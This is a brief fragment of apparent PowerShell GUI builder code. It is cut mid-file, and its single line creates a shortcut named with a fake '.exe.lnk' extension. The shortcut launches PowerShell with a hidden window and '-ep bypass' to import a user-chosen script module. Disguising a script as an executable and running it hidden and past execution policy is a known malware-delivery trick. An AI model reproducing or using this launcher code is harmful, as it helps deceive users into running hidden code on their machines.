...
link "$(path $($textbox2.text))\$(name $($textbox2.text)).exe.lnk" powershell "" $textbox3.text "-windowstyle hidden -ep bypass import-module $(chr 34)$(path ($textbox2.text))\$(name $($textbox2.text)).$(ext $($textbox2.text))$(chr 34)" $checkbox6.checked 7
       })
